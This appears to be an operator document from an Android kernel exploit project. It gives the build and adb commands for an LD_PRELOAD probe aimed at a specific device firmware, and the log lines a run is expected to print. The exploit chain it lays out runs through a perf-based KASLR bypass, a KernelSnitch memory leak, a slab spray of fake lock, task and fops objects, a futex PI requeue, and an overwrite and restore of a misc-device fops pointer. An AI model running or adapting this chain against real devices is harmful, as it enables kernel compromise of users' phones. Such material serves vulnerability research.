# 01. Observation entry and log checks

This document describes only the path that the current probe actually runs. The current boundary is 3.1: after `route-summary`, the worker returns and toybox `id` prints the current process identity.

## Entry

```bash
cd exploit
make probe PROJECT=PD2314-AP3A.240905.015.A2 API=35

adb push build/PD2314-AP3A.240905.015.A2/bin/probe.so /data/local/tmp/probe.so
adb shell 'Z_REFCLONE=1 LD_PRELOAD=/data/local/tmp/probe.so /system/bin/toybox id'
```

Call sequence:

1. `src/preload.c` constructor prints `probe loader starting`.
2. `targets/.../main.c` checks `Z_REFCLONE=1` in `run_probe()`.
3. `refclone_load()` forks a worker and passes `PROBE_WORKER=1`, `PROBE_ATTEMPT=N`, and `LD_PRELOAD`.
4. The worker clears its own `LD_PRELOAD`, validates fingerprint and kernel release.
5. The worker runs `refclone_run_probe()`.

## Key logs

A valid observation run should include these classes of log lines:

```text
[+] probe worker starting pid=...
[+] probe context pid=... uid=... euid=... gid=... egid=... attr=...
[*] perf probe policy paranoid=...
[*] perf probe candidate page=...
[+] slide-kaslr-perf-ok pid=... base=... slide=...
[*] kernelsnitch collision-scan leaked mm=...
[*] tcp payload geometry slab_base=... fake_lock=... fake_w0=... fake_task=... fake_fops=...
[*] final lock mode=active-final ... waiters_tree=... leftmost=...
[*] main FUTEX_CMP_REQUEUE_PI ret=... errno=...
[*] slide ip side effect calls=... sched_ok=...
[*] misc.fops restore target=... original=... ret=8 errno=0
[+] misc.fops restored to ashmem_fops
[+] route-summary pid=... kaslr=1 base=... slide=... route_done=1
uid=... gid=... groups=...
```

| Field | Meaning |
| --- | --- |
| `base` / `slide` | live KASLR image base and slide derived from perf samples |
| `leaked mm` | `mm_struct`-adjacent address recovered by the KernelSnitch collision path |
| `slab_base` | order-3 slab base from `leaked mm & ~0x7fff` |
| `fake_lock` / `fake_w0` / `fake_task` / `fake_fops` | in-page payload object addresses |
| `waiters_tree` | fake lock waiter rb-tree head, not UID/GID state |
| `misc.fops restore ret=8` | eight-byte restore of `dashmem_misc.fops` to `ashmem_fops` |
| `route_done=1` | futex/rt_mutex route threads reached the expected end |

## 3.1 stop boundary

The 3.1 loop is:

`perf base -> mm/slab -> payload spray -> futex PI route -> dashmem_misc.fops route -> restore -> route-summary`

There is no second-stage action after `route-summary`; the current source ends there.
